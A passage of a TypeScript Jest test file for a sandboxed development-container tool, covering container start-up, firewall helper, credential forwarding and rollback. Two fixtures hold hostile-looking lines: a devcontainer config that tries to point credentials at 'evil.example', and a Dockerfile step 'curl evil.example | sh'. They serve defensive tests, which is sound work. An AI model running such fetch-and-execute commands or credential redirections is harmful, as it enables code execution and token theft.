import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';
import { FakeBackend } from './fake-backend';
import { ContainerInfo, ContainerSpec, ExecIO } from '../backend';
import { containerNames, labelsFor, LABEL } from '../names';
import { SANDBOX_IMAGE, NETHELPER_IMAGE } from '../image';
import { SEED_MARKER } from '../seed';
import { describeGuard } from '../env';
import { KunjConfig } from '../../../types';

let keepDir = '';
let keptFiles: string[] = [];

jest.mock('../seed', () => {
  const actual = jest.requireActual('../seed') as object;
  return {
    ...actual,
    inspectOrigin: jest.fn(),
    refExistsOnOrigin: jest.fn(),
    pushBranch: jest.fn(),
    hostGitIdentity: jest.fn(),
  };
});

jest.mock('../../keep', () => ({
  getKeepDir: () => keepDir,
  listKeptFiles: () => keptFiles,
}));

import * as seed from '../seed';
import {
  startContainer,
  stopContainer,
  removeContainer,
  inspectForRemove,
  containerStatus,
  forwardedEnv,
  firewallEnv,
  StartError,
  StartOptions,
  BUILD_NETWORK_WARNING,
} from '../lifecycle';

const mocked = seed as jest.Mocked<typeof seed>;

const VERSION = '9.9.9';
const REPO = { root: '/repo', name: 'app', id: 'github.com/acme/app', originUrl: 'https://github.com/acme/app.git' };
const BRANCH = 'feature/x';
const names = containerNames(REPO.name, REPO.id, BRANCH);
const READY = 'test -f /tmp/kunj-ready';
const MARKER = `test -f ${SEED_MARKER}`;

let tmp: string;
const GIT_ENV = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@e', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@e' };

function options(over: Partial<StartOptions> = {}): StartOptions {
  return {
    branch: BRANCH,
    create: false,
    publish: [],
    rebuild: false,
    config: { container: {} } as KunjConfig,
    repo: REPO,
    kunjVersion: VERSION,
    hostEnv: { GH_TOKEN: 'tok', ANTHROPIC_API_KEY: 'k' },
    cwd: tmp,
    jsonMode: false,
    skipHooks: false,
    keepOnError: false,
    confirmPush: async () => true,
    warn: () => {},
    ...over,
  };
}

function backend(): FakeBackend {
  const b = new FakeBackend();
  b.existingImages.add(SANDBOX_IMAGE(VERSION));
  b.existingImages.add(NETHELPER_IMAGE(VERSION));
  // No seed marker yet, and no postCreate marker
  b.execResults.set(MARKER, { exitCode: 1, stdout: '' });
  return b;
}

function runSpecs(b: FakeBackend): ContainerSpec[] {
  return b.callsOf('run').map(a => a[0] as ContainerSpec);
}

function execCmds(b: FakeBackend): string[] {
  return b.callsOf('exec').map(a => (a[1] as string[]).join(' '));
}

function info(over: Partial<ContainerInfo>): ContainerInfo {
  return {
    id: 'main-id',
    name: names.container,
    state: 'running',
    image: SANDBOX_IMAGE(VERSION),
    createdAt: '',
    labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main' }),
    ports: [],
    ...over,
  };
}

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'kunj-lifecycle-'));
  keepDir = path.join(tmp, 'keep');
  keptFiles = [];
  mocked.inspectOrigin.mockResolvedValue({
    originUrl: REPO.originUrl,
    originHost: 'github.com',
    credentialHost: 'github.com',
    branchOnOrigin: true,
    unpushed: 0,
    isSsh: false,
  });
  mocked.refExistsOnOrigin.mockResolvedValue(true);
  mocked.pushBranch.mockResolvedValue();
  mocked.hostGitIdentity.mockResolvedValue({ name: 'Ada', email: 'ada@example.com' });
});

afterEach(() => {
  fs.rmSync(tmp, { recursive: true, force: true });
  jest.clearAllMocks();
});

describe('startContainer', () => {
  it('creates network, volumes, helper and container in order', async () => {
    const b = backend();
    const result = await startContainer(b, options());

    expect(b.methods().slice(0, 12)).toEqual([
      'info',
      'inspectLabels',
      'imageExists',
      'imageExists',
      'createNetwork',
      'volumeExists',
      'createVolume',
      'volumeExists',
      'createVolume',
      'run',
      'run',
      'exec',
    ]);
    const [main, helper] = runSpecs(b);
    expect(main.name).toBe(names.container);
    // Only what chown and sudo need; NET_RAW in particular is gone
    expect(main.capDrop).toEqual(['ALL']);
    expect(main.capabilities).toEqual(['CHOWN', 'DAC_OVERRIDE', 'FOWNER', 'SETUID', 'SETGID']);
    expect(main.securityOpt).toBeUndefined();
    expect(main.extraHosts).toEqual(['host.docker.internal:host-gateway']);
    expect(main.init).toBe(true);
    // The image's own ENTRYPOINT never runs
    expect(main.entrypoint).toEqual(['sleep']);
    expect(main.command).toEqual(['infinity']);
    expect(main.user).toBe('dev');
    expect(main.workdir).toBe('/workspace');
    expect(main.volumes).toEqual([
      { name: names.workspaceVolume, path: '/workspace' },
      { name: names.homeVolume, path: '/home/dev' },
    ]);
    expect(main.env).toEqual({ GH_TOKEN: 'tok', ANTHROPIC_API_KEY: 'k', KUNJ_CREDENTIAL_HOST: 'github.com' });
    expect(main.labels[LABEL.role]).toBe('main');
    expect(JSON.parse(main.labels[LABEL.options])).toEqual({ firewall: 'default', allowHost: false, publish: [], helperEnv: helper.env, user: 'dev' });

    expect(helper.name).toBe(names.helper);
    expect(helper.image).toBe(NETHELPER_IMAGE(VERSION));
    expect(helper.networkOf).toBe('id-1');
    expect(helper.capabilities).toEqual(['NET_ADMIN', 'NET_RAW']);
    // docker refuses --add-host with --network container:<id>
    expect(helper.extraHosts).toBeUndefined();
    expect(helper.init).toBe(false);
    expect(helper.labels[LABEL.role]).toBe('helper');
    expect(helper.env.KUNJ_FW_ORIGIN_HOST).toBe('github.com');
    // origin's port, so the allowlist check can reach an origin that is not on 443 or 22
    expect(helper.env.KUNJ_FW_ORIGIN_PORT).toBe('443');

    // The seed runs only after the helper reported ready
    const cmds = execCmds(b);
    const seedAt = cmds.findIndex(c => c.startsWith('sh -c set -e'));
    expect(seedAt).toBeGreaterThan(cmds.indexOf(READY));
    expect(result).toMatchObject({ containerId: 'id-1', created: true, seeded: true, firewall: 'default' });
  });

  it('runs nothing in the container before the helper reports ready', async () => {
    const b = backend();
    // Ready on the third poll
    b.existingImages.add('custom:1');
    let polls = 0;
    const real = b.exec.bind(b);
    b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
      const r = await real(id, cmd, io);
      if (cmd.join(' ') === READY) return { exitCode: ++polls >= 3 ? 0 : 1, stdout: '' };
      return r;
    };
    await startContainer(b, options({ imageOverride: 'custom:1' }));
    const execs = b.callsOf('exec').map(a => ({ id: a[0], cmd: (a[1] as string[]).join(' ') }));
    const readyAt = execs.findIndex((e, i) => e.cmd === READY && execs.slice(0, i + 1).filter(x => x.cmd === READY).length === 3);
    expect(readyAt).toBeGreaterThan(-1);
    expect(execs.slice(0, readyAt).every(e => e.id === 'id-2' && e.cmd === READY)).toBe(true);
    // id -u / tool checks for a non-sandbox image come after ready too
    expect(execs.slice(readyAt + 1).some(e => e.id === 'id-1')).toBe(true);
  });

  it("resolves the image's own user with id -un after ready, and passes no -u for it", async () => {
    const b = backend();
    b.existingImages.add('custom:1');
    b.execResults.set('id -un', { exitCode: 0, stdout: 'node\n' });
    const result = await startContainer(b, options({ imageOverride: 'custom:1' }));
    expect(result.user).toBe('node');
    expect(runSpecs(b)[0].user).toBeUndefined();
    expect(JSON.parse(runSpecs(b)[0].labels[LABEL.options]).user).toBe('');
    const execs = b.callsOf('exec');
    const whoami = execs.findIndex(a => (a[1] as string[]).join(' ') === 'id -un');
    expect(whoami).toBeGreaterThan(execs.findIndex(a => (a[1] as string[]).join(' ') === READY));
    expect((execs[whoami][2] as ExecIO | undefined)?.user).toBeUndefined();
    // Nothing in the main container gets -u for an image's own user
    expect(execs.filter(a => a[0] === 'id-1').every(a => !(a[2] as ExecIO | undefined)?.user)).toBe(true);

    // The sandbox's user is known: no lookup
    const sandbox = backend();
    expect((await startContainer(sandbox, options())).user).toBe('dev');
    expect(execCmds(sandbox)).not.toContain('id -un');
  });

  it('gives the credential helper host:port and the firewall the bare host and port', async () => {
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: 'https://git.example.com:8443/acme/app.git',
      originHost: 'git.example.com',
      credentialHost: 'git.example.com:8443',
      branchOnOrigin: true,
      unpushed: 0,
      isSsh: false,
    });
    const b = backend();
    await startContainer(b, options());
    const [main, helper] = runSpecs(b);
    expect(main.env.KUNJ_CREDENTIAL_HOST).toBe('git.example.com:8443');
    expect(helper.env).toMatchObject({ KUNJ_FW_ORIGIN_HOST: 'git.example.com', KUNJ_FW_ORIGIN_PORT: '8443' });
  });

  it('streams the credential helper into any image before seeding and points git at it', async () => {
    const b = backend();
    b.existingImages.add('custom:1');
    b.execResults.set('sh -c printf %s "$HOME"', { exitCode: 0, stdout: '/home/node' });
    await startContainer(b, options({ imageOverride: 'custom:1' }));
    const execs = b.callsOf('exec');
    const tarAt = execs.findIndex(a => (a[1] as string[]).includes('/home/node/.kunj/bin'));
    const seedAt = execs.findIndex(a => (a[1] as string[])[2]?.startsWith('set -e'));
    expect(tarAt).toBeGreaterThan(-1);
    expect(tarAt).toBeLessThan(seedAt);
    expect((execs[tarAt][1] as string[])[2]).toContain('tar -xf -');
    const tar = b.stdinData[tarAt]!;
    expect(tar).toContain('git-credential-kunj');
    expect(tar).toContain('KUNJ_CREDENTIAL_HOST');
    // mode 0755 in the ustar header
    expect(tar.slice(100, 107)).toBe('0000755');
    expect((execs[seedAt][1] as string[])[2]).toContain("credential.helper '/home/node/.kunj/bin/git-credential-kunj'");

    // No token: no helper
    const none = backend();
    await startContainer(none, options({ hostEnv: { ANTHROPIC_API_KEY: 'k' } }));
    expect(none.callsOf('exec').some(a => (a[1] as string[]).some(x => x.includes('.kunj/bin')))).toBe(false);
  });

  it('refuses a name whose labels do not match', async () => {
    const b = backend();
    b.existing = [info({ labels: labelsFor(REPO.id, 'feature-x', { [LABEL.role]: 'main' }) })];
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'collision' });
    expect(b.methods()).not.toContain('run');
  });

  it('fails with unpushed when the user declines the push', async () => {
    const b = backend();
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: REPO.originUrl,
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: true,
      unpushed: 2,
      isSsh: false,
    });
    const err = await startContainer(b, options({ confirmPush: async () => false })).catch(e => e);
    expect(err).toBeInstanceOf(StartError);
    expect(err.code).toBe('unpushed');
    expect(mocked.pushBranch).not.toHaveBeenCalled();
    expect(b.methods().filter(m => m.startsWith('create') || m === 'run')).toEqual([]);
  });

  it('pushes when the user accepts, and never prompts in json mode', async () => {
    mocked.inspectOrigin.mockResolvedValue({
      originUrl: REPO.originUrl,
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: false,
      unpushed: 1,
      isSsh: false,
    });
    await startContainer(backend(), options());
    expect(mocked.pushBranch).toHaveBeenCalledWith(BRANCH, tmp);

    const confirmPush = jest.fn(async () => true);
    await expect(startContainer(backend(), options({ jsonMode: true, confirmPush }))).rejects.toMatchObject({ code: 'unpushed' });
    expect(confirmPush).not.toHaveBeenCalled();
  });

  it('refuses a base that is not on origin, an ssh origin without a token and a hostless origin', async () => {
    mocked.refExistsOnOrigin.mockResolvedValue(false);
    await expect(startContainer(backend(), options({ create: true, base: 'nope' }))).rejects.toMatchObject({ code: 'base-missing' });

    mocked.inspectOrigin.mockResolvedValue({
      originUrl: 'git@github.com:acme/app.git',
      originHost: 'github.com',
      credentialHost: 'github.com',
      branchOnOrigin: true,
      unpushed: 0,
      isSsh: true,
    });
    await expect(startContainer(backend(), options({ hostEnv: {} }))).rejects.toMatchObject({ code: 'no-token' });

    mocked.inspectOrigin.mockResolvedValue({ originUrl: '/srv/app.git', originHost: '', credentialHost: '', branchOnOrigin: true, unpushed: 0, isSsh: false });
    await expect(startContainer(backend(), options())).rejects.toMatchObject({ code: 'origin' });
  });

  it('rolls back everything created when seed fails', async () => {
    const failSeed = (b: FakeBackend) => {
      const real = b.exec.bind(b);
      b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
        const r = await real(id, cmd, io);
        return cmd[0] === 'sh' && cmd[1] === '-c' && cmd[2].startsWith('set -e') ? { exitCode: 1, stdout: '' } : r;
      };
    };

    const b = backend();
    failSeed(b);
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'seed' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);

    const kept = backend();
    failSeed(kept);
    await expect(startContainer(kept, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'seed' });
    expect(kept.methods()).not.toContain('remove');
  });

  it('fails with firewall when the helper exits, before anything is checked inside', async () => {
    const b = backend();
    b.execErrors.set(READY, new Error('docker exec failed: container is not running'));
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'firewall' });
    // This run created the volumes, so they go too
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);
    expect(execCmds(b)).not.toContain(MARKER);
  });

  it('--keep-on-error keeps the objects but stops a container whose firewall never came up', async () => {
    const b = backend();
    b.execErrors.set(READY, new Error('docker exec failed: container is not running'));
    await expect(startContainer(b, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'firewall' });
    expect(b.methods()).not.toContain('remove');
    expect(b.callsOf('stop')).toEqual([[names.container]]);

    // Once the firewall is up, a later failure leaves it running for debugging
    const seedFails = backend();
    const real = seedFails.exec.bind(seedFails);
    seedFails.exec = async (id: string, cmd: string[], io?: ExecIO) =>
      cmd[2]?.startsWith('set -e') ? { exitCode: 1, stdout: '' } : real(id, cmd, io);
    await expect(startContainer(seedFails, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'seed' });
    expect(seedFails.methods()).not.toContain('stop');

    // Resume: the container it started is stopped, the helper kept
    const resumed = backend();
    resumed.existing = [info({ state: 'exited' })];
    resumed.execErrors.set(READY, new Error('docker exec failed: not running'));
    await expect(startContainer(resumed, options({ keepOnError: true }))).rejects.toMatchObject({ code: 'firewall' });
    expect(resumed.callsOf('stop')).toEqual([['main-id']]);
    expect(resumed.callsOf('remove')).toEqual([[{ containers: [names.helper] }]]);
  });

  it('removes nothing when the network cannot be created', async () => {
    const b = backend();
    b.failOn = 'createNetwork';
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{ containers: [], volumes: [], networks: [] }]]);
  });

  it('rolls back the first volume when the second cannot be created', async () => {
    const b = backend();
    const real = b.createVolume.bind(b);
    b.createVolume = async (name, labels) => {
      if (name === names.homeVolume) throw new Error('docker volume create failed: disk full');
      return real(name, labels);
    };
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{ containers: [], volumes: [names.workspaceVolume], networks: [names.network] }]]);
  });

  it('removes the main container when docker run fails', async () => {
    const b = backend();
    b.failOn = 'run';
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'docker' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);
  });

  it('never removes a volume that existed before a failed fresh start', async () => {
    const b = backend();
    b.volumes.add(names.workspaceVolume);
    b.execErrors.set(READY, new Error('docker exec failed: container is not running'));
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'firewall' });
    expect(b.callsOf('createVolume').map(a => a[0])).toEqual([names.homeVolume]);
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.homeVolume],
      networks: [names.network],
    }]]);
  });

  it('skips seed when the marker exists and reruns it when missing', async () => {
    const seeded = backend();
    seeded.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    const r1 = await startContainer(seeded, options());
    expect(r1.seeded).toBe(false);
    expect(execCmds(seeded).some(c => c.startsWith('sh -c set -e'))).toBe(false);

    const fresh = backend();
    const r2 = await startContainer(fresh, options());
    expect(r2.seeded).toBe(true);
    const seedCall = fresh.callsOf('exec').find(a => (a[1] as string[])[2]?.startsWith('set -e'))!;
    expect((seedCall[2] as ExecIO).user).toBe('dev');
    expect((seedCall[1] as string[])[2]).toContain("git switch 'feature/x'");
  });

  it('resumes a stopped container: starts it and recreates the helper', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [
      info({ state: 'exited' }),
      info({ id: 'helper-id', name: names.helper, state: 'exited', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'helper' }) }),
    ];
    const result = await startContainer(b, options());
    expect(result.created).toBe(false);
    expect(b.callsOf('start')).toEqual([['main-id']]);
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper] }]]);
    expect(runSpecs(b).map(s => s.name)).toEqual([names.helper]);
    expect(runSpecs(b)[0].networkOf).toBe('main-id');
    expect(b.methods()).not.toContain('createNetwork');
  });

  it('rebuild builds the image and recreates the container on the same volumes', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({})];
    const result = await startContainer(b, options({ rebuild: true }));
    expect(result.created).toBe(true);
    const m = b.methods();
    expect(m.indexOf('buildImage')).toBeLessThan(m.indexOf('remove'));
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper, names.container] }]]);
    expect(runSpecs(b).map(s => s.name)).toEqual([names.container, names.helper]);
  });

  it('resumes even when the branch is gone from origin or has unpushed commits, without prompting', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.existing = [info({ state: 'exited' })];
    mocked.inspectOrigin.mockResolvedValue({ originUrl: REPO.originUrl, originHost: 'github.com', credentialHost: 'github.com', branchOnOrigin: false, unpushed: 3, isSsh: false });
    const confirmPush = jest.fn(async () => false);
    const result = await startContainer(b, options({ confirmPush, jsonMode: true }));
    expect(result.created).toBe(false);
    expect(confirmPush).not.toHaveBeenCalled();
    expect(mocked.pushBranch).not.toHaveBeenCalled();
    expect(runSpecs(b)[0].env.KUNJ_FW_ORIGIN_HOST).toBe('github.com');
  });

  it('resume runs postStartCommand as the recorded user', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    const recorded = { user: 'node', postStartCommand: 'npm run dev' };
    b.existing = [info({ state: 'exited', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify(recorded) }) })];
    await startContainer(b, options());
    const post = b.callsOf('exec').find(a => (a[1] as string[]).join(' ') === 'sh -lc npm run dev');
    expect((post?.[2] as ExecIO).user).toBe('node');
  });

  it('reports a collision before any push prompt', async () => {
    const b = backend();
    b.existing = [info({ labels: { other: 'x' } })];
    mocked.inspectOrigin.mockResolvedValue({ originUrl: REPO.originUrl, originHost: 'github.com', credentialHost: 'github.com', branchOnOrigin: false, unpushed: 1, isSsh: false });
    const confirmPush = jest.fn(async () => true);
    await expect(startContainer(b, options({ confirmPush }))).rejects.toMatchObject({ code: 'collision' });
    expect(confirmPush).not.toHaveBeenCalled();
  });

  it('resume stops a container it started when the helper fails', async () => {
    const b = backend();
    b.existing = [info({ state: 'exited' })];
    b.execErrors.set(READY, new Error('docker exec failed: not running'));
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'firewall' });
    expect(b.callsOf('stop')).toEqual([['main-id']]);
    expect(execCmds(b).filter(c => c !== READY)).toEqual([]);
  });

  it('is a no-op for a running container with a running helper', async () => {
    const b = backend();
    b.existing = [
      info({}),
      info({ id: 'helper-id', name: names.helper, labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'helper' }) }),
    ];
    const result = await startContainer(b, options());
    expect(result).toMatchObject({ created: false, seeded: false, containerId: 'main-id' });
    expect(b.methods().filter(m => ['run', 'start', 'remove', 'exec'].includes(m))).toEqual([]);
  });

  it('streams keep files and container.files in and lists them', async () => {
    fs.mkdirSync(path.join(keepDir, 'config'), { recursive: true });
    fs.writeFileSync(path.join(keepDir, 'config', '.env'), 'SECRET=1\n');
    keptFiles = ['config/.env'];
    fs.writeFileSync(path.join(tmp, 'aws-config'), '[default]\n');
    const b = backend();
    const result = await startContainer(b, options({
      config: { container: { files: [`${tmp}/aws-config:~/.aws/config`, `${tmp}/missing:/etc/x`] } } as KunjConfig,
      warn: () => {},
    }));
    expect(result.keptFiles).toEqual(['config/.env']);
    expect(result.copiedFiles).toEqual(['/home/dev/.aws/config']);
    const tarCalls = b.callsOf('exec').filter(a => (a[1] as string[]).some(x => x.includes('tar -xf')));
    expect(tarCalls.map(a => (a[1] as string[]).slice(-1)[0])).toEqual(['/home/dev/.kunj/bin', '/workspace', '/home/dev/.aws']);
    expect(b.stdinData.filter(Boolean).join('')).toContain('SECRET=1');
  });

  it('publishes requested ports on free host ports', async () => {
    const b = backend();
    const result = await startContainer(b, options({ publish: [3000], config: { container: { publish: ['3000', '8080'] } } as KunjConfig }));
    expect(result.publish.map(p => p.container)).toEqual([3000, 8080]);
    expect(new Set(result.publish.map(p => p.host)).size).toBe(2);
    expect(runSpecs(b)[0].publish).toEqual(result.publish);
  });

  it('uses the devcontainer on origin: user, env, ports and post commands', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.mkdirSync(path.join(tmp, '.devcontainer'));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({
      image: 'node:22',
      remoteUser: 'node',
      containerEnv: { FOO: 'bar', KUNJ_CREDENTIAL_HOST: 'evil.example', GH_TOKEN: 'stolen' },
      forwardPorts: [5173],
      postCreateCommand: 'npm ci',
      postStartCommand: 'npm run dev',
    }));
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');

    const b = backend();
    b.existingImages.add('node:22');
    b.execResults.set('id -u', { exitCode: 0, stdout: '1000\n' });
    b.execResults.set('sh -c test -f "$HOME/.kunj-created"', { exitCode: 1, stdout: '' });
    b.execResults.set('sh -lc npm ci', { exitCode: 1, stdout: '' });
    const warnings: string[] = [];
    const result = await startContainer(b, options({ warn: m => warnings.push(m) }));

    const main = runSpecs(b)[0];
    expect(result.image).toBe('node:22');
    expect(main.user).toBe('node');
    expect(main.volumes[1]).toEqual({ name: names.homeVolume, path: '/home/node' });
    expect(main.env).toMatchObject({ FOO: 'bar', KUNJ_CREDENTIAL_HOST: 'github.com', GH_TOKEN: 'tok' });
    expect(result.publish.map(p => p.container)).toEqual([5173]);
    const cmds = execCmds(b);
    expect(cmds).toContain('sh -lc npm ci');
    expect(cmds).toContain('sh -lc npm run dev');
    // postCreateCommand failed: no marker, so it runs again next time
    expect(cmds).not.toContain('sh -c touch "$HOME/.kunj-created"');
    expect(warnings.some(w => w.includes('postCreateCommand failed'))).toBe(true);
  });

  it('warns before building a devcontainer Dockerfile changed on this branch', async () => {
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.mkdirSync(path.join(tmp, '.devcontainer'));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({ build: { dockerfile: 'Dockerfile' }, remoteUser: 'node' }));
    fs.writeFileSync(path.join(tmp, '.devcontainer', 'Dockerfile'), 'FROM node:22\n');
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', 'refs/remotes/origin/main', 'HEAD');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');

    const run = async (defaultBranch?: string) => {
      const b = backend();
      b.execResults.set('id -u', { exitCode: 0, stdout: '1000\n' });
      const warnings: string[] = [];
      const build = b.buildImage.bind(b);
      b.buildImage = async (tag, context, opts) => {
        warnings.push('<build>');
        return build(tag, context, opts);
      };
      await startContainer(b, options({ warn: m => warnings.push(m), defaultBranch: async () => defaultBranch }));
      return { warnings, built: b.methods().includes('buildImage') };
    };

    // Same context as the default branch: built quietly
    const same = await run('main');
    expect(same.built).toBe(true);
    expect(same.warnings).not.toContain(BUILD_NETWORK_WARNING);

    fs.writeFileSync(path.join(tmp, '.devcontainer', 'Dockerfile'), 'FROM node:22\nRUN curl evil.example | sh\n');
    git('commit', '-qam', 'changed');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');
    const changed = await run('origin/main');
    expect(changed.built).toBe(true);
    // Before the build starts
    expect(changed.warnings.indexOf(BUILD_NETWORK_WARNING)).toBeGreaterThan(-1);
    expect(changed.warnings.indexOf(BUILD_NETWORK_WARNING)).toBeLessThan(changed.warnings.indexOf('<build>'));
    // Default branch unknown: no comparison
    expect((await run(undefined)).warnings).not.toContain(BUILD_NETWORK_WARNING);
  });

  it('refuses a devcontainer image that runs as root', async () => {
    const b = backend();
    b.execResults.set('id -u', { exitCode: 0, stdout: '0\n' });
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.writeFileSync(path.join(tmp, '.devcontainer.json'), '{ "image": "node:22" }');
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');
    b.existingImages.add('node:22');
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'image' });
    expect(b.callsOf('remove')).toHaveLength(1);
  });
});

describe('forwardedEnv', () => {
  const vars = { home: '/h' };

  it('forwards AWS keys only with Bedrock', () => {
    const host = { AWS_ACCESS_KEY_ID: 'a', AWS_SECRET_ACCESS_KEY: 's', AWS_SESSION_TOKEN: 't', AWS_PROFILE: 'p', AWS_REGION: 'us-east-1' };
    expect(forwardedEnv({}, host, vars)).toEqual({ AWS_REGION: 'us-east-1' });
    expect(forwardedEnv({}, { ...host, CLAUDE_CODE_USE_BEDROCK: '1' }, vars)).toEqual({
      CLAUDE_CODE_USE_BEDROCK: '1',
      AWS_REGION: 'us-east-1',
      AWS_ACCESS_KEY_ID: 'a',
      AWS_SECRET_ACCESS_KEY: 's',
      AWS_SESSION_TOKEN: 't',
      AWS_PROFILE: 'p',
    });
    expect(forwardedEnv({}, { ...host, CLAUDE_CODE_USE_BEDROCK: '0' }, vars)).not.toHaveProperty('AWS_ACCESS_KEY_ID');
  });

  it('passes NAME=value literally with variables and skips unset or empty names', () => {
    expect(forwardedEnv({ env: ['A=${home}/x', 'B', 'C', 'D=1=2'] }, { B: 'b', C: '' }, vars)).toEqual({ A: '/h/x', B: 'b', D: '1=2' });
  });
});

describe('firewallEnv', () => {
  it('firewall mode is allowlist only when allow is non-empty', () => {
    expect(firewallEnv({}, '', 'github.com', undefined)).toEqual({
      KUNJ_FW_MODE: 'default',
      KUNJ_FW_ALLOW_HOST: '0',
      KUNJ_FW_DOMAINS: '',
      KUNJ_FW_GITHUB: '1',
      KUNJ_FW_ORIGIN_HOST: 'github.com',
      KUNJ_FW_ORIGIN_PORT: '',
      KUNJ_FW_SUBNET: '',
    });
    expect(firewallEnv({}, '', 'example.com', undefined, 8443).KUNJ_FW_ORIGIN_PORT).toBe('8443');
    expect(firewallEnv({ network: { allow: [] } }, '', 'gitlab.com', undefined).KUNJ_FW_MODE).toBe('default');
    const env = firewallEnv({ network: { allow: ['npmjs.org'], allowHost: true } }, '10.0.0.0/24', 'gitlab.com', 'eu-west-1');
    expect(env).toMatchObject({
      KUNJ_FW_MODE: 'allowlist',
      KUNJ_FW_ALLOW_HOST: '1',
      KUNJ_FW_DOMAINS: 'npmjs.org bedrock-runtime.eu-west-1.amazonaws.com',
      KUNJ_FW_GITHUB: '0',
      KUNJ_FW_SUBNET: '10.0.0.0/24',
    });
  });
});

describe('remove', () => {
  const GUARD_KEY_PREFIX = 'sh -c ';

  function guardBackend(stdout: string, opts: { state?: ContainerInfo['state']; origin?: number } = {}): FakeBackend {
    const b = new FakeBackend();
    const fw = { KUNJ_FW_MODE: 'default', KUNJ_FW_ORIGIN_HOST: 'github.com' };
    b.existing = [info({
      state: opts.state ?? 'running',
      labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify({ helperEnv: fw }) }),
    })];
    b.existingImages.add(NETHELPER_IMAGE(VERSION));
    const real = b.exec.bind(b);
    b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
      const r = await real(id, cmd, io);
      if (cmd.join(' ').startsWith(GUARD_KEY_PREFIX)) return { exitCode: 0, stdout };
      if (cmd.includes('ls-remote')) return { exitCode: opts.origin ?? 0, stdout: '' };
      return r;
    };
    return b;
  }

  const CTX = { user: 'dev', kunjVersion: VERSION };
  const CLEAN = '@@refs\nrefs/heads/feature/x 0\n@@stash\n0\n@@stash-exit 0\n@@status\n# branch.oid abc\n# branch.head feature/x\n@@status-exit 0\n';

  it('remove guard refuses on unpushed refs', async () => {
    const stdout = CLEAN.replace('@@stash', 'refs/heads/other 1\n@@stash');
    const b = guardBackend(stdout, { state: 'exited' });
    await expect(removeContainer(b, names, { force: false, keepVolumes: false, user: 'dev', kunjVersion: VERSION })).rejects.toThrow(/--force/);
    // Started behind a fresh helper, and nothing exec'd in it before the helper was ready
    expect(b.callsOf('start')).toEqual([['main-id']]);
    const helper = runSpecs(b)[0];
    expect(helper).toMatchObject({ name: names.helper, networkOf: 'main-id', env: { KUNJ_FW_MODE: 'default', KUNJ_FW_ORIGIN_HOST: 'github.com' } });
    const cmds = execCmds(b);
    expect(cmds[0]).toBe(READY);
    expect(cmds[1]).toMatch(/^sh -c /);
    // Put back the way it was
    expect(b.callsOf('stop')).toEqual([[names.helper], [names.container]]);
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper] }]]);

    const guard = await inspectForRemove(guardBackend(stdout), names, CTX);
    expect(guard).toEqual({ unpushedRefs: ['refs/heads/other'], stashes: 0, dirty: false, originReachable: true });

    const forced = guardBackend(stdout);
